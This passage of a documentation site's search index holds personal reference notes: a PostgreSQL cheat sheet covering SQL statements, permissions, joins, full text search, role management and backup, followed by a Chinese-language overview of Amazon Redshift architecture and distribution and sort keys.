<li>Time Machine: backup daily, create APFS Container on external disk, create Time Machine volumes for each machine separately</li> </ul>"},{"location":"software/ohos.html","title":"OpenHarmonyOS","text":""},{"location":"software/ohos.html#apps","title":"Apps","text":"<ul> <li>smbsbz/moonlight-ohos</li> <li>Aloereed/localsend-ohos</li> <li>azhu003/localsend-harmony</li> </ul>"},{"location":"software/postgresql.html","title":"PostgreSQL","text":""},{"location":"software/postgresql.html#sql-language","title":"SQL Language","text":""},{"location":"software/postgresql.html#common-statements","title":"Common statements","text":"<ul> <li>CREATE TABLE</li> <li>INSERT INTO table [columns] VALUES (value1, value2)</li> <li>COPY table FROM</li> <li>SELECT columns FROM table WHERE condition ORDER BY columns</li> <li>SELECT columns FROM tableA JOIN tableB ON columnA = columnB</li> <li>SELECT columns FROM tableA,tableB WHERE columnA = columnB</li> <li>SELECT columns FROM table GROUP BY columns</li> <li>SELECT columns FROM table GROUP BY columns HAVING conditions</li> <li>SELECT columns FROM table WHERE conditions GROUP BY columns</li> <li>Limit aggregation range: SELECT columns, aggregation FILTER (WHERE condition), columns FROM table GROUP BY columns</li> <li>Window functions: SELECT columns, aggregation OVER (PARTITION BY condition [ORDER BY column]), columns FROM table GROUP BY columns</li> <li>UPDATE table SET column = value WHERE condition</li> <li>DELETE FROM table WHERE condition</li> <li>CREATE VIEW view AS SELECT</li> <li>Foreign key: references table(field) in CREATE TABLE</li> <li>BEGIN</li> <li>COMMIT</li> <li>SAVEPOINT savepoint</li> <li>ROLLBACK to savepoint</li> <li>Inheritance: CREATE TABLE table schema INHERITS table</li> <li>CREATE FUNCTION name(arguments) RETURNS type AS $$ BODY $$ LANGUAGE SQL IMMUTABLE STRICT</li> <li>ALTER TABLE table ADD COLUMN</li> <li>ALTER TABLE table DROP COLUMN</li> <li>ALTER TABLE table ADD CHECK</li> <li>ALTER TABLE table ADD CONSTRAINT</li> <li>ALTER TABLE table DROP CONSTRAINT</li> <li>ALTER TABLE table ALTER COLUMN</li> <li>ALTER TABLE table RENAME COLUMN</li> <li>ALTER TABLE table RENAME TO</li> <li>ALTER TABLE table OWNER TO role</li> <li>GRANT perms ON table TO role</li> <li>SELECT DISTINCT</li> <li>SELECT DISTINCT ON</li> <li>Common Table Expression: WITH name AS (query)</li> </ul>"},{"location":"software/postgresql.html#permissions","title":"Permissions","text":"<ul> <li>SELECT</li> <li>INSERT</li> <li>UPDATE</li> <li>DELETE</li> <li>TRUNCATE</li> <li>REFERENCES</li> <li>TRIGGER</li> <li>CREATE</li> <li>CONNECT</li> <li>TEMPORARY</li> <li>EXECUTE</li> <li>USAGE</li> <li>SET</li> <li>ALTER SYSTEM</li> </ul>"},{"location":"software/postgresql.html#generated-columns","title":"Generated Columns","text":"<ul> <li>Add computed columns</li> <li>Stored vs virtual</li> </ul>"},{"location":"software/postgresql.html#constraint","title":"Constraint","text":"<ul> <li>Check constraints</li> <li>Not null</li> <li>Unique: allow multiple nulls</li> <li>Unique including null (NULLS NOT DISTINCT)</li> <li>Primary key</li> <li>Foreign key, on delete no action/restrict/cascade/set null</li> <li>Exclusion constraint</li> </ul>"},{"location":"software/postgresql.html#builtin-variablesfunctions","title":"Builtin variables/functions","text":"<ul> <li>version()</li> <li>current_date</li> </ul>"},{"location":"software/postgresql.html#joins","title":"Joins","text":"<ul> <li>cross join: cartesian product</li> <li>inner join: <code>For each row R1 of T1, the joined table has a row for each row in T2 that satisfies the join condition with R1.</code></li> <li>left outer join: <code>First, an inner join is performed. Then, for each row in T1 that does not satisfy the join condition with any row in T2, a joined row is added with null values in columns of T2. Thus, the joined table always has at least one row for each row in T1.</code></li> <li>right outer join: <code>First, an inner join is performed. Then, for each row in T2 that does not satisfy the join condition with any row in T1, a joined row is added with null values in columns of T1. This is the converse of a left join: the result table will always have a row for each row in T2.</code></li> <li>full outer join: <code>First, an inner join is performed. Then, for each row in T1 that does not satisfy the join condition with any row in T2, a joined row is added with null values in columns of T2. Also, for each row of T2 that does not satisfy the join condition with any row in T1, a joined row with null values in the columns of T1 is added.</code></li> </ul> <p>JOIN USING (a, b) means JOIN ON T1.a = T2.a AND T1.b = T2.b</p> <p>evaluation order:</p> <ol> <li>JOIN</li> <li>WHERE</li> <li>GROUP BY</li> <li>HAVING</li> </ol>"},{"location":"software/postgresql.html#full-text-search","title":"Full text search","text":"<ul> <li>Convert text to tsvector for searching: to_tsvector(lang, text)</li> <li>Check if text matches: to_tsvector(lang, text) @@ to_tsquery(query)</li> <li>Compute rank: ts_rank(tsvector, tsquery)</li> <li>Highlight match: ts_headline(lang, text, tsquery)</li> <li>Create inverted index (GIN, Generalized Inverted Index): CREATE INDEX index ON table USING GIN (to_tsvector(lang, text))</li> </ul>"},{"location":"software/postgresql.html#connection","title":"Connection","text":"<ul> <li>via unix socket: e.g. <code>/tmp/.s.PGSQL.5432</code></li> <li>via tcp: e.g. <code>localhost:5432</code></li> </ul>"},{"location":"software/postgresql.html#commands","title":"Commands","text":"<ul> <li>createdb [dbname]</li> <li>dropdb [dbname]</li> <li>psql [-U rolename] [dbname]<ul> <li>\\h: help</li> <li>\\q: quit</li> <li>\\i: input from file</li> <li>\\s: single step mode</li> <li>\\dp: dump privilege</li> </ul> </li> </ul>"},{"location":"software/postgresql.html#role-management","title":"Role management","text":"<ul> <li>CREATE ROLE role [LOGIN] [SUPERUSER] [CREATEDB] [CREATEROLE] [PASSWORD password]</li> <li>CREATE USER role</li> <li>DROP ROLE role</li> <li><code>createuser role</code></li> <li><code>dropuser role</code></li> <li>SELECT * FROM pg_roles</li> <li><code>\\du</code> in psql cli</li> <li>GRANT group_role TO role</li> <li>REVOKE group_role FROM role</li> <li>SET ROLE role</li> <li>RESET ROLE</li> <li>ALTER TABLE table OWNER TO role</li> <li>REASSIGN OWNED BY roleA TO roleB</li> <li>DROP OWNED BY role</li> </ul>"},{"location":"software/postgresql.html#backup-and-restore","title":"Backup and restore","text":"<ul> <li>Backup one database: pg_dump database &gt; database.sql</li> <li>Backup all databases: pg_dumpall &gt; database.sql</li> <li>Restore after creating database: psql database &lt; database.sql</li> <li>Backup and restore for replication: pg_dump dbA | psql dbB</li> </ul>"},{"location":"software/postgresql.html#upgrade-major-version","title":"Upgrade major version","text":"<ol> <li>Backup old database</li> <li>Install new version of PostgreSQL while keeping the old one</li> <li>Restore backup to the new version manually, or use <code>pg_upgrade</code></li> </ol>"},{"location":"software/postgresql.html#db-cluster-management","title":"DB cluster management","text":"<ul> <li>Initialize PostgreSQL: initdb -D path</li> <li>Start PostgreSQL interactively: postgres -D path</li> <li>Start/stop PostgreSQL as daemon: pg_ctl -D path start/stop</li> </ul>"},{"location":"software/redshift.html","title":"Amazon Redshift","text":"<p>\u200b\u672c\u6587\u200b\u57fa\u4e8e\u200b Amazon Redshift Database Developer Guide \u200b\u6574\u7406\u200b\u3002</p>"},{"location":"software/redshift.html#_1","title":"\u67b6\u6784","text":"<p>\u200b\u6587\u6863\u200b\uff1aAmazon Redshift System and architecture overview</p> <p>Redshift \u200b\u96c6\u7fa4\u200b\u7531\u200b\u82e5\u5e72\u4e2a\u200b compute node \u200b\u7ec4\u6210\u200b\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\u4e24\u4e2a\u200b\u6216\u200b\u4ee5\u4e0a\u200b\u7684\u200b compute nodes\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u989d\u5916\u200b\u7684\u200b leader node\u3002\u200b\u5ba2\u6237\u7aef\u200b\u548c\u200b leader node \u200b\u901a\u4fe1\u200b\uff0c\u200b\u5982\u679c\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b compute node\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u200b\u4e5f\u200b\u4f1a\u200b\u5145\u5f53\u200b leader node \u200b\u7684\u200b\u4f5c\u7528\u200b\u3002</p> <p>\u200b\u6570\u636e\u200b\u5206\u5e03\u5f0f\u200b\u5730\u200b\u4fdd\u5b58\u200b\u5728\u200b S3 \u200b\u548c\u200b compute node \u200b\u7684\u200b\u672c\u5730\u200b SSD \u200b\u5b58\u50a8\u200b\u4e0a\u200b\uff0c\u200b\u901a\u8fc7\u200b Redshift Managed Storage\uff08RMS\uff09\u200b\u81ea\u52a8\u200b\u7ba1\u7406\u200b\uff0c\u200b\u672c\u5730\u200b SSD \u200b\u5b58\u50a8\u200b\u76f8\u5f53\u4e8e\u200b\u662f\u200b S3 \u200b\u7684\u200b cache\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u5e76\u884c\u6027\u200b\uff0c\u200b\u6570\u636e\u200b\u4f1a\u200b\u5206\u5e03\u200b\u5230\u200b\u5404\u4e2a\u200b compute node \u200b\u4e0a\u200b\uff0c\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u6bcf\u4e2a\u200b compute node \u200b\u5206\u4e3a\u200b\u591a\u4e2a\u200b slice\uff0cslice \u200b\u4f1a\u200b\u5e73\u5206\u200b compute node \u200b\u7684\u200b\u5404\u79cd\u200b\u8d44\u6e90\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b9e\u9645\u4e0a\u200b\u6570\u636e\u200b\u5206\u53d1\u200b\u7684\u200b\u7c92\u5ea6\u200b\u662f\u200b slice\u3002\u200b\u6bcf\u4e2a\u200b slice \u200b\u5185\u90e8\u200b\u8fdb\u884c\u200b\u8ba1\u7b97\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u7ed3\u679c\u200b\u53d1\u9001\u5230\u200b leader node \u200b\u4e0a\u200b\u8fdb\u884c\u200b\u5408\u5e76\u200b\uff0c\u200b\u6700\u540e\u200b\u53d1\u7ed9\u200b\u5ba2\u6237\u7aef\u200b\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u4e3a\u4e86\u200b\u6027\u80fd\u200b\uff0c\u200b\u6700\u597d\u200b\u662f\u200b\u6bcf\u4e2a\u200b slice \u200b\u53ea\u7528\u200b\u5230\u200b\u672c\u5730\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5c3d\u91cf\u907f\u514d\u200b slice \u200b\u4e4b\u95f4\u200b\u9700\u8981\u200b\u6570\u636e\u901a\u4fe1\u200b\u7684\u200b\u60c5\u51b5\u200b\u3002\u200b\u4e3a\u4e86\u200b\u5206\u53d1\u200b\u6570\u636e\u200b\u5230\u200b\u5404\u4e2a\u200b slice\uff0cRedshift \u200b\u8bbe\u8ba1\u200b\u4e86\u200b distribution key\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b distribution key \u200b\u4ee5\u53ca\u200b distribution style\uff0c\u200b\u51b3\u5b9a\u200b\u6570\u636e\u200b\u5982\u4f55\u200b\u5206\u53d1\u200b\u5230\u200b\u5404\u4e2a\u200b slice \u200b\u91cc\u200b\uff0c\u200b\u76ee\u7684\u200b\u662f\u200b\u540e\u7eed\u200b\u67e5\u8be2\u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u4ee5\u200b\u66f4\u5feb\u200b\u5730\u200b\u627e\u5230\u200b\u8981\u200b\u7528\u5230\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>Redshift \u200b\u91c7\u7528\u200b\u5217\u5f0f\u200b\u5b58\u50a8\u200b\uff0c\u200b\u540c\u4e00\u200b\u5217\u200b\u76f8\u90bb\u200b\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u662f\u200b\u8fde\u7eed\u200b\u5b58\u653e\u200b\u7684\u200b\uff0c\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b column major \u200b\u7684\u200b\u77e9\u9635\u200b\u4fdd\u5b58\u200b\u5f62\u5f0f\u200b\u3002\u200b\u7531\u4e8e\u200b\u6bcf\u200b\u4e00\u5217\u200b\u7684\u200b\u5927\u5c0f\u200b\u4e00\u822c\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u662f\u200b\u5b9a\u957f\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u53ef\u4ee5\u200b\u66f4\u52a0\u200b\u7d27\u5bc6\u200b\u5730\u200b\u4fdd\u5b58\u200b\u4e0b\u6765\u200b\uff0c\u200b\u4e5f\u200b\u65b9\u4fbf\u200b\u8fdb\u884c\u200b\u538b\u7f29\u200b\u3002\u200b\u67e5\u8be2\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53ea\u200b\u8bbf\u95ee\u200b\u8981\u200b\u7528\u5230\u200b\u7684\u200b\u5217\u200b\uff0c\u200b\u4e0d\u53bb\u200b\u8bfb\u53d6\u200b\u6ca1\u200b\u8bbf\u95ee\u200b\u5230\u200b\u7684\u200b\u5217\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7701\u200b\u4e0b\u6765\u200b\u8fd9\u90e8\u5206\u200b I/O \u200b\u65f6\u95f4\u200b\u3002Redshift \u200b\u91c7\u7528\u200b 1MB \u200b\u5927\u5c0f\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u7528\u6765\u200b\u5b58\u50a8\u200b\u6bcf\u200b\u4e00\u5217\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>Redshift \u200b\u652f\u6301\u200b\u8bf7\u6c42\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5728\u200b\u8fdb\u884c\u200b SQL \u200b\u67e5\u8be2\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u66fe\u7ecf\u200b\u5b8c\u6210\u200b\u8fc7\u200b\u540c\u6837\u200b\u7684\u200b SQL \u200b\u67e5\u8be2\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u200b\u6bb5\u65f6\u95f4\u200b\u5185\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u53d8\u5316\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u8bf7\u6c42\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u76f4\u63a5\u200b\u628a\u200b\u7ed3\u679c\u200b\u53d6\u51fa\u200b\u6765\u200b\uff0c\u200b\u4e0d\u7528\u200b\u91cd\u65b0\u200b\u67e5\u8be2\u200b\u3002</p>"},{"location":"software/redshift.html#_2","title":"\u6700\u4f73\u200b\u5b9e\u8df5","text":"<p>\u200b\u6587\u6863\u200b\uff1aAmazon Redshift Best practices</p>"},{"location":"software/redshift.html#distribution-key","title":"Distribution key","text":"<p>Distribution key \u200b\u548c\u200b distribution style \u200b\u51b3\u5b9a\u200b\u4e86\u200b\u6570\u636e\u200b\u5982\u4f55\u200b\u5206\u5e03\u200b\u5728\u200b\u5404\u4e2a\u200b slice \u200b\u4e2d\u200b\u3002\u200b\u5982\u679c\u200b\u9884\u5148\u200b\u8bbe\u597d\u200b\u7684\u200b\u5206\u5e03\u200b\u65b9\u6848\u200b\u4e0e\u200b\u5b9e\u9645\u200b\u67e5\u8be2\u200b\u65f6\u6240\u200b\u671f\u671b\u200b\u7684\u200b\u5206\u5e03\u200b\u65b9\u6848\u200b\u4e0d\u540c\u200b\uff0c\u200b\u5c31\u200b\u9700\u8981\u200b\u901a\u4fe1\u200b\u4ee5\u200b\u91cd\u65b0\u200b\u5206\u53d1\u200b\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6027\u80fd\u200b\u5c31\u200b\u4f1a\u200b\u53d7\u5230\u200b\u5f71\u54cd\u200b\u3002\u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0c\u200b\u8fd8\u200b\u5c3d\u91cf\u200b\u8981\u200b\u4fdd\u8bc1\u200b\u4e0d\u540c\u200b slice \u200b\u6bd4\u8f83\u200b\u5747\u5300\u200b\u5730\u5206\u200b\u5230\u200b\u6570\u636e\u200b\uff0c\u200b\u907f\u514d\u200b\u5c11\u6570\u200b slice \u200b\u4fdd\u5b58\u200b\u548c\u200b\u5904\u7406\u200b\u5927\u90e8\u5206\u200b\u6570\u636e\u200b\uff0c\u200b\u5f71\u54cd\u200b\u5e76\u884c\u6027\u200b\uff0c\u200b\u540c\u7406\u200b\uff0c\u200b\u8fdb\u884c\u200b\u67e5\u8be2\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u8981\u200b\u5c3d\u91cf\u200b\u4fdd\u8bc1\u200b\u6bcf\u4e2a\u200b slice \u200b\u90fd\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u8ba1\u7b97\u200b\u53ef\u4ee5\u200b\u505a\u200b\u3002</p> <p>Distribution Style \u200b\u6709\u200b\u8fd9\u4e48\u200b\u51e0\u79cd\u200b\uff1a</p> <ol> <li>AUTO\uff1a\u200b\u7531\u200b Redshift \u200b\u81ea\u52a8\u200b\u9009\u62e9\u200b</li> <li>EVEN\uff1a\u200b\u6ca1\u6709\u200b Distribution key\uff0c\u200b\u63d2\u5165\u200b\u6570\u636e\u200b\u65f6\u200b\u76f4\u63a5\u200b Round-robin \u200b\u5f0f\u200b\u628a\u200b\u6570\u636e\u200b\u5206\u53d1\u200b\u5230\u200b\u5404\u4e2a\u200b slice \u200b\u4e0a\u200b</li> <li>KEY\uff1a\u200b\u6309\u7167\u200b Distribution key\uff08\u200b\u67d0\u200b\u4e00\u4e2a\u200b column\uff09\u200b\u8fdb\u884c\u200b\u5206\u53d1\u200b\uff0c\u200b\u5982\u679c\u200b\u67d0\u200b\u4e24\u884c\u200b\u5728\u200b Distribution key \u200b\u4e0b\u200b\u7684\u200b\u503c\u200b\u76f8\u540c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u200b\u4e24\u884c\u200b\u4f1a\u200b\u88ab\u200b\u5206\u5230\u200b\u540c\u4e00\u4e2a\u200b slice \u200b\u4e0a\u200b</li> <li>ALL\uff1a\u200b\u628a\u200b\u6570\u636e\u200b\u590d\u5236\u5230\u200b\u6240\u6709\u200b\u7684\u200b node \u200b\u4e0a\u200b\uff0c\u200b\u6bcf\u4e2a\u200b node \u200b\u4fdd\u5b58\u200b\u4e00\u4efd\u200b\u5b8c\u6574\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u4f9b\u200b\u6240\u6709\u200b slice \u200b\u8bfb\u53d6\u200b</li> </ol> <p>\u200b\u9009\u62e9\u200b Distribution style \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8981\u200b\u7ed3\u5408\u200b workload \u200b\u6765\u200b\u8fdb\u884c\u200b\u5206\u6790\u200b\u3002\u200b\u5982\u679c\u200b\u4e3b\u8981\u200b\u7684\u200b\u67e5\u8be2\u200b\u662f\u200b\u5bf9\u200b\u4e24\u4e2a\u200b\u8868\u200b\u8fdb\u884c\u200b join\uff0c\u200b\u628a\u200b\u8981\u200b join \u200b\u7684\u200b key \u200b\u8bbe\u200b\u4e3a\u200b Distribution key \u200b\u662f\u200b\u6bd4\u8f83\u200b\u5408\u7406\u200b\u7684\u200b\u65b9\u6848\u200b\uff0c\u200b\u8fd9\u6837\u200b\u4e24\u4e2a\u200b\u8868\u200b\u7684\u200b\u6570\u636e\u200b\u91cc\u200b\u7684\u200b\u5177\u6709\u200b\u540c\u4e00\u4e2a\u200b join key \u200b\u7684\u200b\u884c\u4f1a\u200b\u4fdd\u5b58\u200b\u5728\u200b\u540c\u4e00\u4e2a\u200b slice \u200b\u5185\u90e8\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6bcf\u4e2a\u200b slice \u200b\u5185\u90e8\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b8c\u6210\u200b join \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u5728\u200b slice \u200b\u4e4b\u95f4\u200b\u901a\u4fe1\u200b\u3002</p> <p>\u200b\u66f4\u200b\u8be6\u7ec6\u200b\u7684\u200b\u539f\u5219\u200b\u89c1\u200b Designating distribution styles\uff0c\u200b\u7b80\u5355\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u7ecf\u5e38\u200b join \u200b\u7684\u200b key\uff0c\u200b\u5c31\u200b\u8bbe\u4e3a\u200b\u5bf9\u5e94\u200b table \u200b\u7684\u200b distribution key</li> <li>\u200b\u6bcf\u4e2a\u200b table \u200b\u7684\u200b distribution key \u200b\u53ea\u80fd\u200b\u6709\u200b\u4e00\u4e2a\u200b\uff0c\u200b\u4f46\u662f\u200b\u8981\u200b join \u200b\u591a\u4e2a\u200b\u8868\u200b\uff0c\u200b\u600e\u4e48\u529e\u200b\uff1f\u200b\u9009\u200b\u6027\u80fd\u200b\u5f71\u54cd\u200b\u6700\u5927\u200b\u7684\u200b\u90a3\u4e2a\u200b\uff0c\u200b\u6839\u636e\u200b\u8981\u200b join \u200b\u7684\u200b\u8868\u200b\u7684\u200b\u5927\u5c0f\u200b\u6765\u200b\u4f30\u8ba1\u200b\uff0c\u200b\u4f30\u8ba1\u200b\u5927\u200b\u5c0f\u65f6\u200b\u4e0d\u8981\u200b\u5fd8\u8bb0\u200b\u8003\u8651\u200b filter</li> <li>\u200b\u5b9e\u5728\u200b\u4e0d\u597d\u200b\u8bbe\u8ba1\u200b distribution key\uff0c\u200b\u53c8\u200b\u60f3\u200b\u63d0\u5347\u200b\u67e5\u8be2\u200b\u6027\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b ALL distribution style\uff0c\u200b\u7528\u200b\u7a7a\u95f4\u200b\u6362\u200b\u65f6\u95f4\u200b</li> <li>\u200b\u5bf9\u4e8e\u200b\u6027\u80fd\u200b\u5f71\u54cd\u200b\u4e0d\u5927\u200b\u7684\u200b\u8868\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b Redshift \u200b\u81ea\u52a8\u200b\u9009\u62e9\u200b</li> </ol> <p>\u200b\u4e3a\u4e86\u200b\u786e\u8ba4\u200b\u5206\u5e03\u200b\u65b9\u6848\u200b\u662f\u5426\u200b\u5408\u7406\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b EXPLAIN \u200b\u8bed\u53e5\u200b\u83b7\u53d6\u200b\u5e38\u7528\u200b SQL \u200b\u67e5\u8be2\u200b\u7684\u200b Query Plan\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b Redshift \u200b\u662f\u200b\u600e\u4e48\u200b\u6267\u884c\u200b\u8fd9\u200b\u6761\u200b SQL \u200b\u8bed\u53e5\u200b\u7684\u200b\uff0c\u200b\u5728\u200b\u91cc\u9762\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u4e0d\u540c\u200b Distribution key \u200b\u7684\u200b\u5f71\u54cd\u200b\u3002</p>"},{"location":"software/redshift.html#sort-key","title":"Sort key","text":"<p>\u200b\u6587\u6863\u200b\uff1aChoose the best sort key \u200b\u548c\u200b Working with sort keys</p> <p>\u200b\u9664\u4e86\u200b Distribution key \u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4e00\u4e2a\u200b\u5f88\u200b\u91cd\u8981\u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u5c31\u662f\u200b Sort key\u3002Sort key \u200b\u5bf9\u5e94\u200b\u6570\u636e\u5e93\u200b\u91cc\u200b\u7684\u200b\u7d22\u5f15\u200b\uff08Index\uff09\uff0c\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u628a\u200b\u6570\u636e\u200b\u6309\u7167\u200b\u4ec0\u4e48\u200b\u987a\u5e8f\u200b\u6392\u5e8f\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u67e5\u8be2\u200b\u3002\u200b\u4f20\u7edf\u200b\u6570\u636e\u5e93\u200b\u6bcf\u4e2a\u200b\u8868\u200b\u652f\u6301\u200b\u591a\u4e2a\u200b Index\uff0c\u200b\u6bcf\u4e2a\u200b Index \u200b\u53ef\u4ee5\u200b\u7528\u200b\u4e0d\u540c\u200b\u7684\u200b Key\uff0c\u200b\u90a3\u4e48\u200b\u67e5\u8be2\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u8fd9\u4e9b\u200b Index \u200b\u6765\u200b\u52a0\u901f\u200b\u67e5\u8be2\u200b\u3002Redshift \u200b\u5219\u200b\u4e0d\u540c\u200b\uff0c\u200b\u5b83\u200b\u6bcf\u4e2a\u200b\u8868\u200b\u76f8\u5f53\u4e8e\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b Index\uff1a\u200b\u6570\u636e\u200b\u7528\u200b Sort key \u200b\u6392\u597d\u5e8f\u200b\u5e76\u200b\u4fdd\u5b58\u200b\uff0c\u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u7684\u200b B \u200b\u6811\u200b\uff0c\u200b\u53ea\u662f\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u6bcf\u4e2a\u200b Block \u200b\u7684\u200b\u6700\u5927\u200b\u6700\u5c0f\u503c\u200b\uff0c\u200b\u6240\u4ee5\u200b Sort key \u200b\u7684\u200b\u9009\u53d6\u200b\u5bf9\u200b\u6027\u80fd\u200b\u4e5f\u200b\u662f\u200b\u5f88\u200b\u91cd\u8981\u200b\u7684\u200b\u3002</p> <p>Distribution key \u200b\u4e3b\u8981\u200b\u6d89\u53ca\u200b\u5230\u200b slice \u200b\u4e4b\u95f4\u200b\u7684\u200b\u6570\u636e\u5206\u5e03\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u67e5\u8be2\u200b\u65f6\u200b slice \u200b\u4e4b\u95f4\u200b\u9700\u8981\u200b\u591a\u5c11\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b\u3002\u200b\u800c\u200b Sort key \u200b\u4e3b\u8981\u200b\u6d89\u53ca\u200b\u7684\u200b\u662f\u200b slice \u200b\u5185\u90e8\u200b\u5b9e\u73b0\u200b\u67e5\u8be2\u200b\u65f6\u200b\uff0c\u200b\u80fd\u5426\u200b\u9ad8\u6548\u200b\u5730\u200b\u8fdb\u884c\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\u5bf9\u200b\u4e24\u4e2a\u200b\u8868\u200b\u8fdb\u884c\u200b join \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u4e24\u4e2a\u200b\u8868\u90fd\u200b\u6309\u7167\u200b join key \u200b\u6392\u597d\u200b\u4e86\u200b\u5e8f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7528\u200b\u7c7b\u4f3c\u200b\u5f52\u5e76\u200b\u6392\u5e8f\u200b\u7684\u200b\u5f52\u5e76\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53cc\u200b\u6307\u9488\u200b\u5feb\u901f\u200b\u5730\u200b\u540c\u65f6\u200b\u904d\u5386\u200b\u4e24\u8fb9\u200b\u7684\u200b\u8868\u200b\u7684\u200b\u540c\u4e00\u4e2a\u200b join key\u3002\u200b\u5982\u679c\u200b\u6ca1\u6392\u200b\u597d\u5e8f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u8981\u200b fallback \u200b\u5230\u200b\u54c8\u5e0c\u200b\u8868\u200b join\uff0c\u200b\u4ece\u200b\u4e00\u4e2a\u200b\u8868\u200b\u6784\u5efa\u200b\u54c8\u5e0c\u200b\u8868\u200b\uff0c\u200b\u904d\u5386\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u8868\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u54c8\u5e0c\u200b\u8868\u91cc\u200b\u5bfb\u627e\u200b join key \u200b\u5339\u914d\u200b\u7684\u200b\u884c\u200b\u3002\u200b\u518d\u200b\u6bd4\u5982\u200b\u5bf9\u200b\u67d0\u4e9b\u200b\u5217\u200b\u8fdb\u884c\u200b\u8fc7\u6ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u5df2\u7ecf\u200b\u6309\u5217\u6392\u200b\u597d\u5e8f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f88\u5feb\u200b\u5730\u200b\u627e\u5230\u200b\u4e0a\u200b\u4e0b\u754c\u200b\uff0c\u200b\u4e0d\u7528\u200b\u4e00\u4e2a\u4e2a\u200b\u53bb\u200b\u904d\u5386\u200b\u3002</p> <p>\u200b\u76f8\u6bd4\u200b Distribution key \u200b\u53ea\u80fd\u200b\u8bbe\u7f6e\u200b\u4e00\u4e2a\u200b\u5217\u200b\uff0cSort key \u200b\u5219\u200b\u66f4\u52a0\u200b\u7075\u6d3b\u200b\uff0c\u200b\u5b83\u200b\u652f\u6301\u200b\u5982\u4e0b\u200b\u6a21\u5f0f\u200b\uff1a</p> <ol> <li>COMPOUND\uff1a\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u591a\u4e2a\u200b\u5217\u200b\uff0c\u200b\u6309\u591a\u200b\u5173\u952e\u5b57\u200b\u6392\u5e8f\u200b\uff0c\u200b\u90a3\u4e48\u200b\u6309\u7167\u200b Sort key \u200b\u7684\u200b\u524d\u7f00\u200b\u5217\u200b\u8fdb\u884c\u200b\u67e5\u8be2\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u6392\u597d\u5e8f\u200b\u7684\u200b\u6027\u8d28\u200b\uff0c\u200b\u63d0\u5347\u200b\u67e5\u8be2\u200b\u6027\u80fd\u200b</li> 